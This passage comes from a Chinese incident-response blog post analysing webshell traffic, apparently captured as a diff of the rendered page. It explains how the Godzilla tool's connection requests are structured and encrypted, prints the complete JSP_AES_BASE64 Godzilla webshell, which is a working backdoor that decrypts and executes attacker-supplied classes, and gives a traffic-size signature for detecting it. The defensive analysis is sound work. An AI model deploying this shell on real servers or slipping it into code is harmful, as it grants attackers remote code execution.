+<h4 id="shell流量加密过程分析"><a href="#shell流量加密过程分析" class="headerlink" title="shell流量加密过程分析"></a>shell流量加密过程分析</h4><p>这里从Shell Setting对话框中的<code>测试连接</code>操作开始分析。在Shell Setting对话框中，设置代理为Burp，然后点击<code>测试连接</code>按钮，可以看到一共会产生3个<code>POST</code>数据包，POST请求报文中参数名都是<code>pass</code>（即shell的连接密码），参数值都是加密数据。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020734219.png#id=BCauv&originHeight=983&originWidth=1582&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><strong>第一次请求:</strong><br>第1个请求会发送大量数据，该请求不含有任何<code>Cookie</code>信息，服务器响应报文不含任何数据，但是会设置<code>PHPSESSID</code>，后续请求都会自动带上该Cookie。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020736429.png#id=rQA67&originHeight=1001&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><strong>第二次请求:</strong><br>可以看到，第2个请求中已经自动带上了第1个请求中服务器响应返回的<code>Cookie</code>值，并且第2个请求中只有少量的数据<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020736283.png#id=pgE30&originHeight=1001&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><strong>第3个请求与第2个请求完全一致</strong><br>哥斯拉解密PHP脚本:<a target="_blank" rel="noopener" href="https://github.com/think3t/godzilla_decoder">https://github.com/think3t/godzilla_decoder</a></p>
+<h3 id="JSP-AES-BASE64加密分析"><a href="#JSP-AES-BASE64加密分析" class="headerlink" title="JSP_AES_BASE64加密分析"></a>JSP_AES_BASE64加密分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 定义了一个类似于预共享密钥</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line"><span class="comment">// 定义了一个密码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line"><span class="comment">// 将密钥和密码拼接起来后进行md5加密</span></span><br><span class="line"><span class="comment">// 定义了一个class类并且继承动态类加载</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 进行AES加密</span></span><br><span class="line">        javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 进行MD5加密</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    java.security.MessageDigest m;</span><br><span class="line">    m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">    m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">    ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 进行Base64加密</span></span><br><span class="line">        base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取方法并且调用</span></span><br><span class="line">        value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            <span class="type">byte</span>[].class</span><br><span class="line">        &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            bs</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射查找BASE64Encoder类</span></span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">            <span class="comment">// // 通过反射获取方法并且调用</span></span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                <span class="type">byte</span>[].class</span><br><span class="line">            &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                bs</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解密函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            String.class</span><br><span class="line">        &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            bs</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                bs</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125; </span><br><span class="line">%&gt; </span><br><span class="line">    &lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 解密接收到的数据</span></span><br><span class="line">    <span class="type">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">data = x(data, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 判断Payload是否存在,存在则执行</span></span><br><span class="line"><span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">X</span>(<span class="built_in">this</span>.getClass().getClassLoader()).Q(data));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">    java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">    f.equals(arrOut);</span><br><span class="line">    f.equals(pageContext);</span><br><span class="line">    <span class="comment">// 截取md5加密后的前16位,并写入到response中</span></span><br><span class="line">    response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    f.toString();</span><br><span class="line">    response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">    response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125; </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>通过 抓包可以得到以下流量,可以发现其实和PHP的差不多,jsp还有一个强特征,那就是测试的这三条数据的大小为<strong>长短短</strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020752860.png#id=nJw1P&originHeight=1001&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>我们进入shell之后，随便抓取一条流量就可以拿到任意一个哥斯拉解密软件中,即可解密,如图:<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021935076.png#id=YK2C4&originHeight=965&originWidth=794&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/07/05/dd58c5ed/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/07/05/dd58c5ed/&title=应急响应之Webshell流量分析 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407260026884.png&summary=常用的WebShell客户端
+中国菜刀(使用量最大，适用范围最广的WebShell客户端)
+蚁剑(一种常用的WebShell客户端)
+冰蝎(流量加密客户端)
+哥斯拉
+Weevely(kali中的中国菜刀)
+
+C刀
+PHP类WebShe..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=应急响应之Webshell流量分析 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/07/05/dd58c5ed/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/07/05/dd58c5ed/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/06/9e820566/">应急响应之日志分析</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/04/dd58c5ed/">应急响应之Wireshark流量分析</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\07\04\dd58c5ed\" title="应急响应之Wireshark流量分析"><span class="title">应急响应之Wireshark流量分析</span></a><a class="item" href="\2021\09\19\2dd5e334\" title="ELK收集nginx日志并展示来源IP地图"><span class="title">ELK收集nginx日志并展示来源IP地图</span></a><a class="item" href="\2022\09\06\6e6b1513\" title="基于Awstats的Apache日志分析"><span class="title">基于Awstats的Apache日志分析</span></a><a class="item" href="\2024\07\03\ac635236\" title="应急响应-从攻击谈防守"><span class="title">应急响应-从攻击谈防守</span></a><a class="item" href="\2021\09\26\1b012da8\" title="CorePress主题优化"><span class="title">CorePress主题优化</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84WebShell%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">常用的WebShell客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E5%88%80"><span class="toc-text">C刀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%B1%BBWebShell%E9%93%BE%E6%8E%A5%E6%B5%81%E9%87%8F"><span class="toc-text">PHP类WebShell链接流量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91-AntSword"><span class="toc-text">中国蚁剑(AntSword)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-text">冰蝎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-V2"><span class="toc-text">冰蝎 V2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jspShell"><span class="toc-text">jspShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-V3"><span class="toc-text">冰蝎 V3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-V4"><span class="toc-text">冰蝎 V4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-XOR-BASE64%E5%8A%A0%E5%AF%86shell%E5%88%86%E6%9E%90"><span class="toc-text">PHP_XOR_BASE64加密shell分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81"><span class="toc-text">Shell服务端代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">shell流量加密过程分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSP-AES-BASE64%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-text">JSP_AES_BASE64加密分析</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
